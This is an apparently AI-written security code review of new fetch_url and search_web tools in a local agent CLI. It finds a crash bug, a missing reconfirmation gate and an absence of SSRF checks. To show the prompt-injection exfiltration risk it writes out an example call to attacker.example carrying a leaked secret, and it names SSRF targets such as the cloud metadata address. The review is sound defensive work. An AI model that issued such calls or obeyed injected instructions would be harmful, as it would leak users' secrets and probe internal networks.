---
phase: 06-lightweight-web-search-fetch
reviewed: 2026-09-09T00:00:00Z
depth: standard
files_reviewed: 6
files_reviewed_list:
  - src/olla/tools/web.py
  - src/olla/loop.py
  - src/olla/prompts.py
  - tests/test_tools/test_web.py
  - tests/test_loop.py
  - tests/test_prompts.py
findings:
  critical: 3
  warning: 4
  info: 1
  total: 8
status: issues_found
---

# Phase 06: Code Review Report

**Reviewed:** 2026-09-09
**Depth:** standard
**Files Reviewed:** 6
**Status:** issues_found

## Summary

Reviewed the new `fetch_url`/`search_web` tools (`src/olla/tools/web.py`) and their
integration into the ReAct loop (`src/olla/loop.py`, `src/olla/prompts.py`), plus the
accompanying test suites. The HTML-stripping and DuckDuckGo-Lite scraping logic itself
is reasonably careful (byte-capped streaming, boilerplate stripping, sponsored-row
exclusion, sentence-boundary truncation), and is well covered by unit tests for the
happy paths and the failure modes the authors anticipated (timeouts, transport errors,
empty query, bot-challenge page).

However, the integration has three critical gaps that were not caught by the existing
tests, all confirmed by direct reproduction against the installed `httpx` version:

1. `fetch_url` can raise an **uncaught** `httpx.InvalidURL` for a plausible class of
   model-supplied URLs, crashing the whole agent loop (not just returning a tool error).
2. `fetch_url`/`search_web` are wired into the loop **without** the
   `untrusted_observation_seen` reconfirmation gate that every other tool (shell,
   write_file) uses to stop prompt-injected instructions from taking silent action —
   these two tools always execute immediately, with or without `--yes`, even
   immediately after untrusted file/shell/memory content was just observed. Since
   `fetch_url` is a live, model-chosen, arbitrary-destination GET request, this is a
   ready-made data-exfiltration channel for a prompt-injection payload encountered via
   `read_file`, `shell`, or `recall`.
3. There is no SSRF protection at all on `fetch_url` — any address (loopback, RFC1918,
   cloud metadata `169.254.169.254`, other local services such as Ollama's own port)
   is fetched with the same zero-confirmation immediacy.

These three compound into a single overall risk: a webpage or file the agent reads can
instruct it to silently exfiltrate previously-observed secrets or probe the local
network via `fetch_url`, and/or crash the process outright.

## Critical Issues

### CR-01: `fetch_url` raises an uncaught `httpx.InvalidURL`, crashing the agent loop

**File:** `src/olla/tools/web.py:184-195`, `src/olla/loop.py:923-941`
**Issue:** `fetch_url` only catches `(httpx.TimeoutException, httpx.TransportError, httpx.HTTPError)`. `httpx.InvalidURL` is **not** a subclass of any of these — it inherits directly from `Exception` — so a malformed URL raises it straight out of `_read_capped`/`fetch_url`, propagates through `_execute_fetch_url`, and crashes `run_loop` with an unhandled traceback instead of producing a normal tool-error Observation. This is reproducible today with the actual code (verified against the installed `httpx`, no mocking):

```
$ python3 -c "
import sys; sys.path.insert(0, 'src')
from olla.tools.web import fetch_url
fetch_url('http://example.com\nX-Injected: true')
"
Traceback (most recent call last):
  ...
httpx.InvalidURL: Invalid non-printable ASCII character in URL, '\n' at position 18.
```

`args_raw` for `fetch_url` is only `.strip()`-ed by the parser (leading/trailing
whitespace), so an **embedded** newline or other invalid character anywhere inside a
model-hallucinated URL (a very plausible failure mode for a 0.6B–7B model, especially
if it tries to wrap `fetch_url` args across multiple lines the way it correctly does
for `write_file`) is not filtered before reaching `httpx`. Nothing above
`_execute_fetch_url` in `run_loop` catches generic exceptions, so this kills the whole
CLI session, not just the current tool call.

No test in `tests/test_tools/test_web.py` or `tests/test_loop.py` exercises a malformed
URL — every negative test uses `mocker.patch(...side_effect=httpx.TimeoutException/...TransportError)`, which never touches this code path.

**Fix:** Add `httpx.InvalidURL` (and ideally catch `Exception` narrowly around the URL-construction step, or use `httpx.URL(url)` first and catch `httpx.InvalidURL` explicitly) to the except clause in both `fetch_url` and `search_web`:

```python
except (
    httpx.TimeoutException,
    httpx.TransportError,
    httpx.HTTPError,
    httpx.InvalidURL,
) as error:
    return {"error": f"fetch_url request failed: {error}"}
```
Also consider validating/rejecting URLs containing control characters up front with a clear tool error, rather than relying on `httpx`'s exception surface.

---

### CR-02: `fetch_url`/`search_web` bypass the `untrusted_observation_seen` reconfirmation gate — exfiltration channel

**File:** `src/olla/loop.py:923-961`, `src/olla/loop.py:1144-1153`
**Issue:** Every other side-effecting tool in this loop enforces a specific security invariant: once `untrusted_observation_seen` becomes `True` (i.e. the model has just seen file content, shell output, or a recalled note — none of which the model should blindly obey), the **next** shell or write_file call requires an interactive confirmation even when `--yes` was passed (see `_execute_shell`'s `if decision["kind"] == "CONFIRM" and (not yes or untrusted_observation_seen)` and the equivalent block in `_execute_write_file`). This is exactly the mechanism the test suite calls out by name in `test_untrusted_file_instruction_cannot_use_yes_for_shell_or_write`, `test_untrusted_shell_output_cannot_use_yes_for_shell_or_write`, and `test_recalled_memory_cannot_use_yes_for_write`.

`_execute_fetch_url` and `_execute_search_web` take no `yes` or `untrusted_observation_seen` parameter at all and unconditionally call `fetch_url(...)`/`search_web(...)` every time, regardless of what was just observed:

```python
def _execute_fetch_url(action, *, step, messages):
    ...
    result = fetch_url(action.args_raw)   # always runs, no confirm, no gate
```

Since `fetch_url` performs a live, attacker-influenceable GET to an arbitrary
model-chosen URL, a prompt-injection payload encountered via `read_file`, `shell`
output, or `recall` can instruct the model to call, e.g.
`fetch_url("http://attacker.example/?leak=<secret just read>")` and it executes
**immediately, with zero confirmation**, even on a run without `--yes`. This is a more
direct and higher-bandwidth exfiltration primitive than the shell/write_file paths that
the rest of the codebase already treats as the primary threat model — but it isn't
covered by any of the "untrusted content can't use yes" tests, and no such test exists
for fetch_url/search_web in `tests/test_loop.py` (the only tests present,
`test_fetch_url_wraps_untrusted_content_and_forces_reconfirmation` and its
`search_web` counterpart, only check that *fetch_url's own output* forces
reconfirmation for the *next* shell call — not that a *preceding* untrusted
observation gates the fetch/search call itself).

**Fix:** Thread `yes`/`untrusted_observation_seen` into `_execute_fetch_url` and
`_execute_search_web` and require confirmation (or at minimum block/refuse) when
`untrusted_observation_seen` is true, mirroring `_execute_shell`:

```python
def _execute_fetch_url(action, *, step, messages, yes, untrusted_observation_seen):
    if untrusted_observation_seen and not _confirmed(action.args_raw):
        _record_observation(messages, "refused: fetch_url follows untrusted tool output; confirm to proceed")
        return False
    ...
```
and update the dispatch in `run_loop` to pass these through, matching the pattern
already used for `shell`/`write_file`.

---

### CR-03: No SSRF/destination restriction on `fetch_url`

**File:** `src/olla/tools/web.py:184-205`
**Issue:** `fetch_url` performs an unrestricted `GET` to whatever URL string the model
supplies — there is no scheme allowlist, no check against loopback/link-local/private
address ranges, and no domain allow/deny list, unlike the shell tool which has an
entire `safety.py` blocklist/allowlist module gating dangerous invocations. Combined
with CR-02 (no confirmation ever required), the model can be steered (via prompt
injection or simple hallucination) into fetching internal-only endpoints such as
`http://127.0.0.1:11434/api/...` (the very Ollama server this CLI drives),
`http://169.254.169.254/latest/meta-data/...` (cloud instance metadata, if `olla` is
ever run in a cloud VM), or other services reachable from the host — all without any
gate or prompt.

**Fix:** At minimum, resolve and reject requests whose target address falls in
loopback/link-local/private ranges (`ipaddress.ip_address(...).is_private`,
`.is_loopback`, `.is_link_local`) before issuing the request, and/or require explicit
confirmation for any `fetch_url` call the same way `shell`'s CONFIRM tier does. This is
a design gap, not just a missing test — there is currently no code path that could
even express "block this fetch."

## Warnings

### WR-01: Web tool observations are not truncated to `MAX_OBSERVATION_CHARS` like every other tool

**File:** `src/olla/loop.py:939`, `src/olla/loop.py:959`
**Issue:** `_execute_read_file`, `_execute_list_dir`, `_execute_grep_files`, and
`_execute_shell` all wrap their content in `truncate_output(...)` (capped at
`MAX_OBSERVATION_CHARS = 2000`) before recording it as an Observation. `_execute_fetch_url`
and `_execute_search_web` do not — they call `_record_web_observation(messages, result.get("content", ""))` directly. `web.py`'s own `_truncate_to_sentence(..., limit=3000)` caps content at up to ~3000 chars (plus the truncation note), so a single fetch/search Observation can be 50%+ larger than every other tool's budget. This directly works against the project's stated core value ("minimal per-turn token overhead ... small local models ... don't drift into wrong answers under a bloated context" — see `CLAUDE.md`), and is inconsistent with the rest of the codebase's uniform 2000-char Observation budget.
**Fix:** Apply `truncate_output(...)` to the web content the same way the other tools do, e.g. `_record_web_observation(messages, truncate_output(result.get("content", "")))`, or lower `_truncate_to_sentence`'s default limit to match `MAX_OBSERVATION_CHARS`.

### WR-02: HTTP response status code is never checked

**File:** `src/olla/tools/web.py:145-153, 184-205`
**Issue:** `_read_capped` streams the response body regardless of `response.status_code`; neither `fetch_url` nor `search_web` calls `response.raise_for_status()` or otherwise inspects the status. A `404`/`403`/`500` error page's body is returned as ordinary `{"content": ...}` with no indication anything went wrong, which can mislead the (often small, easily confused) model into treating an error page as the real answer.
**Fix:** Check `response.status_code` after the stream context is entered and surface non-2xx responses as `{"error": ...}` (or at least annotate the content with the status), e.g.:
```python
with client.stream(method, url, **kwargs) as response:
    status = response.status_code
    for chunk in response.iter_bytes():
        ...
if status >= 400:
    return {"error": f"fetch_url: server returned HTTP {status}"}
```

### WR-03: DuckDuckGo-Lite result parser uses inconsistent class-matching strategy

**File:** `src/olla/tools/web.py:86-102`
**Issue:** Sponsored-row detection uses a substring check, `"result-sponsored" in css_class` (line 91), but result-link/result-snippet detection uses strict equality, `css_class == "result-link"` / `css_class == "result-snippet"` (lines 96, 100). If DuckDuckGo ever emits an anchor/cell with an additional class alongside `result-link`/`result-snippet` (a very common real-world HTML pattern, e.g. `class="result-link result-link--new"`), the strict-equality checks silently stop matching any results — `search_web` would then fall through to the "no results found" / bot-challenge branches with no diagnostic distinguishing "genuinely no results" from "our scraper just broke." The mismatched strategy (substring for one check, equality for the other) also suggests this wasn't a deliberate, considered choice.
**Fix:** Use consistent substring/token matching for all three checks (e.g. split `css_class` on whitespace and check membership: `"result-link" in css_class.split()`), and consider logging/flagging when zero results are parsed from a page that isn't a genuine no-results or bot-challenge page.

### WR-04: No overall wall-clock timeout on capped streaming reads

**File:** `src/olla/tools/web.py:17, 145-153`
**Issue:** `_TIMEOUT = httpx.Timeout(connect=5.0, read=10.0, write=5.0, pool=5.0)` bounds each individual socket operation, not the total request duration. `httpx` has no built-in "total" timeout, so a server that trickles data at a low rate (e.g. one byte every 9 seconds) never triggers the 10s read timeout per chunk but can keep `_read_capped`'s loop running indefinitely, hanging the whole agent turn well past any user-perceived timeout.
**Fix:** Track elapsed wall-clock time in `_read_capped` and abort (raising/returning an error) once a total budget (e.g. 20-30s) is exceeded, independent of the per-chunk timeout.

## Info

### IN-01: `_truncate_to_sentence` treats any URL/abbreviation period as a sentence boundary

**File:** `src/olla/tools/web.py:59-70`
**Issue:** The truncation heuristic looks for the last `.`/`!`/`?` anywhere in the truncation window, without regard for context — a period inside a domain name (`example.com`), abbreviation (`e.g.`), or decimal number (`3.14`) is treated the same as a real sentence end, which can produce oddly-placed cuts especially in URL-heavy `search_web` output.
**Fix:** Low priority given this is a best-effort heuristic for small-model consumption; if it becomes a problem in practice, consider a slightly smarter boundary check (e.g. require the char after the punctuation to be whitespace or end-of-window) rather than a bare `rfind`.

---

_Reviewed: 2026-09-09_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
